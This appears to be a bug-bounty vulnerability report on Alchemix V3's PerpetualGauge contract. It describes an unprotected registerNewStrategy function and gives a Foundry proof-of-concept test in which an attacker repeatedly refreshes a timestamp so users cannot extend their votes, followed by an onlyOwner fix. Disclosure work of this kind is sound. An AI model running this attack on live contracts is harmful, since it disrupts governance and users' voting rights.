
#  Smart Contract Vulnerability Report
**Alchemix V3**:

##  Vulnerability Title 

Vote Freeze Attack: lastStrategyAddedAt


##  Report Type

Smart Contract


##  Target

- https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/PerpetualGauge.sol



## Asset

PerpetualGauge.sol



##  Rating

Severity: Medium
Impact: Medium
Likelihood: Medium



##  Description


A vulnerable function exists (`registerNewStrategy`) that affects two other functions:
`vote()` and `getCurrentAllocations()`.


`registerNewStrategy()` :
There is a vulnerable function (`registerNewStrategy`) that can update `lastStrategyAddedAt` without any access control.


What is `lastStrategyAddedAt`?
`lastStrategyAddedAt` is a timestamp (per `ytId`) that records when a new strategy was registered. The contract uses this value when determining whether vote expiries can be reset or extended.



`vote()` :
In `vote()`, the contract uses `lastStrategyAddedAt` as part of the logic to compute a voter’s `expiry`. Because `getCurrentAllocations()` reads weights from the stored vote arrays, manipulating `lastStrategyAddedAt` can cause votes to either expire prematurely or become inappropriately locked. As a result, users may be unable to update their votes, and asset allocations can be performed based on outdated or stale vote data.



`getCurrentAllocations()`:

`getCurrentAllocations()` itself does not modify votes or strategies; it only reads the weights and normalizes them.

Now, if the first bug causes votes to be frozen in the `vote()` function, users cannot submit new votes or update their existing votes.

 This means that when `getCurrentAllocations()` is called, the weights are still outdated because the new voteshave not been recorded.(old vote)


FLow attack &  POC  👇🏽




##  Impact


- Since anyone can call `registerNewStrategy`, an attacker can modify the `lastStrategyAddedAt` value.
As a result, users’ votes may expire prematurely or remain locked for an extended period.

This prevents users from updating their votes and disrupts the voting system.


- Moreover, because `getCurrentAllocations()` calculates weights from the vote arrays, outdated or unexpired votes can cause asset allocations to be based on incorrect or stale data.





##  Vulnerability Details


There is no require or access control modifier (like onlyOwner or role-based checks) — anyone can call it.

```solidity 

// Vulnerable function
function registerNewStrategy(uint256 ytId, uint256 strategyId) external nonReentrant {
    lastStrategyAddedAt[ytId] = block.timestamp;
}





// Affected function
function vote(uint256 ytId, uint256[] calldata strategyIds, uint256[] calldata weights) external nonReentrant {
    ...
    if (existing.expiry > block.timestamp) {
        uint256 timeLeft = existing.expiry - block.timestamp;
        if (lastAdded > 0 && block.timestamp - lastAdded < MIN_RESET_DURATION && timeLeft < MIN_RESET_DURATION) {
            expiry = existing.expiry; 
        ...
        }
    }
}




// Affected function
function getCurrentAllocations(uint256 ytId) public view {
    ...
}

```


##  Proof of Concept (PoC)


Flow attack🐧 :

We have a strategy that users must vote for.

A user calls the `vote` function and votes for that strategy.

That user’s vote stays active for 365 days.

A user can only extend their vote when the following condition is **not** true:

``if (lastAdded > 0 && block.timestamp - lastAdded < MIN_RESET_DURATION && timeLeft < MIN_RESET_DURATION)``


In other words, to extend their vote the user needs **at least one** of these to be false: either there must be **more than 30 days** remaining before their vote expires, or the strategy must have been added **more than 30 days ago**  -->  That’s exactly the spot the attacker can manipulate.



What the attacker does:

* The attacker makes sure that the entire condition above is **always true**, 
* Concretely, the attacker repeatedly calls `registerNewStrategy`, which updates `lastStrategyAddedAt[ytId]` (the `lastAdded` value).
* Because `lastAdded` is constantly refreshed, this keeps the sub-condition `block.timestamp - lastAdded < MIN_RESET_DURATION` true.

Now, if a user is inside the last 30 days of their vote and tries to extend it, they **cannot**.

Why?

* All three parts of the `if` condition become true, so the extension is blocked — because the attacker keeps forcing `block.timestamp - lastAdded < MIN_RESET_DURATION` to be true.
* This should not be possible: nobody should be able to arbitrarily update the strategy timestamp at any time, because otherwise **no one** would be able to extend their vote during the last 30 days.






📌 Full POC ---- >  github link -----> download and run :👇🏽



POC 🐧 :


```solidity 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PerpetualGauge.sol";


// This mock simulates the voting token that was originally   `IERC20 public votingToken;`   in the main contract
contract MockVotingToken is IERC20 {
    mapping(address => uint256) public balances;
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimalsVal = 18;

    function totalSupply() external pure override returns (uint256) { return 0; }
    function balanceOf(address account) external view override returns (uint256) { return balances[account]; }
    function allowance(address, address) external pure override returns (uint256) { return 0; }
    function transfer(address, uint256) external pure override returns (bool) { revert(); }
    function approve(address, uint256) external pure override returns (bool) { revert(); }
    function transferFrom(address, address, uint256) external pure override returns (bool) { revert(); }

    function mint(address who, uint256 amount) external {
        balances[who] = balances[who] + amount;
    }
}


// This mock simulates the `IStrategyClassifier` contract to satisfy the constructor
contract MockStratClassifier is IStrategyClassifier {
    function getStrategyRiskLevel(uint256) external pure override returns (uint8) { return 0; }
    function getIndividualCap(uint256) external pure override returns (uint256) { return 10000; } // 100%
    function getGlobalCap(uint8) external pure override returns (uint256) { return 10000; } // 100%
}


// This mock simulates the `IAllocatorProxy` contract to satisfy the constructor
contract MockAllocatorProxy is IAllocatorProxy {
    event AllocCalled(uint256 strategyId, uint256 amount);
    function allocate(uint256 strategyId, uint256 amount) external override {
        emit AllocCalled(strategyId, amount);
    }
}


//TEST contract 
contract PerpetualGauge_RegisterNewStrategy_PoC is Test {
    PerpetualGauge gauge;
    MockVotingToken token;
    MockStratClassifier classifier;
    MockAllocatorProxy allocator;

  
    address good_user = address(0x1001); // User who will cast a vote
    address bad_user  = address(0x1002); // User who will attempt to freeze the vote

    uint256 constant YieldTokenID = 1;   // ID of a specific token or yield pool
    uint256 constant STID = 10;          // ID of a specific strategy to be registered or allocated in the test



    function setUp() public {
        // deploy mocks
        token = new MockVotingToken();
        classifier = new MockStratClassifier();
        allocator = new MockAllocatorProxy();

        // deploy PerpetualGauge with mock addresses
        gauge = new PerpetualGauge(address(classifier), address(allocator), address(token));

        // give good_user  some voting power
        token.mint(good_user, 1e18); // 1 token (with 18 decimals)
    }




    /// @notice Go to the main contract at /src/PerpetualGauge.sol  in lines 60, 61, 62, 63
    /// @notice This `revert()` was added only to indicate that the vote renewal is frozen
    /// @notice📌 The reason for adding this is that no message was shown inside to indicate the failure to renew; otherwise, this revert has no effect on the function's behavior 

    ///@dev follow comments 👇🏽
    
    ///    forge test -vvvv

    function test_freeze_vote_by_registerNewStrategy() public {
            // Prepare vote input
            uint256[] memory sids=new uint256[](1);
            sids[0] = STID; // ID
            uint256[] memory wts=new uint256[](1);
            wts[0] = 100; // weight

        // There must be a strategy that the user can vote for
        gauge.registerNewStrategy(YieldTokenID, 999);

        //  good_user casts a vote
        vm.prank(good_user); // good user
        gauge.vote(YieldTokenID, sids, wts);
        // 365 days of user vote validity has started


        // Now 25 days remain for the good_user to extend their vote
        vm.warp(block.timestamp + 340 days);


        // But bad_user updates the strategy again, making all conditions of this line true  --------> if (lastAdded > 0 && block.timestamp - lastAdded < MIN_RESET_DURATION && timeLeft < MIN_RESET_DURATION)
        // so that good_user cannot extend their vote 
        vm.prank(bad_user);
        gauge.registerNewStrategy(YieldTokenID, 999);
        

        // Now good_user tries to extend their vote, but it fails because this condition is also true ----------> block.timestamp - lastAdded < MIN_RESET_DURATION

        vm.expectRevert(bytes("You cannot extend your vote due to the strategy being updated."));
        vm.prank(good_user);
        gauge.vote(YieldTokenID, sids, wts);
        


    }


}

```

## How to fix it (Recommended)


//add this 
`import "@openzeppelin/contracts/access/Ownable.sol";`


//add in contract PerpetualGauge
contract PerpetualGauge is `Ownable` {}


//add onlyOwner  in registerNewStrategy()
    function registerNewStrategy(uint256 ytId, uint256 strategyId) external onlyOwner {}


##  References

- https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/PerpetualGauge.sol





